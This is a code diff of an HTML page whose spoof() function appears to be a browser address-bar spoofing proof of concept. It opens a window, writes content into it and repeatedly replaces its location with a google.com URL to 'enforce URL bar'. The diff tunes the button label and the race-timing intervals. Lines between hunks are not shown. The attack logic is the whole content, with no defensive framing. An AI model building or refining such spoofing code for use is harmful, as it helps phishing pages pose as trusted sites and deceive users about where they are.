@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <body>
-<button onclick="spoof()">CLICK </button>
+<button onclick="spoof()">CLICKKkkkkkkkkkkk </button>
 
 <script>
 function spoof() {
@@ -30,14 +30,14 @@ function spoof() {
             `);
             win.document.close();
         }catch(e){}
-    }, 90);
+    }, 10);
 
     // 4) delayed location replace to enforce URL bar
     setTimeout(()=>{
         try {
             win.location.replace("https://www.google.com:8080");
         }catch(e){}
-    }, 300);
+    }, 900);
 
     // 5) continuous override fallback
     let fallback = setInterval(()=>{
@@ -45,13 +45,13 @@ function spoof() {
             win.location.replace("https://www.google.com:8080");
             win.stop();
         }catch(e){}
-    }, 120);
+    }, 1200);
 
     // 6) auto cleanup after 6s (optional)
     setTimeout(()=>{
         clearInterval(killer);
         clearInterval(fallback);
-    }, 6000);
+    }, 50);
 
 }
 </script>
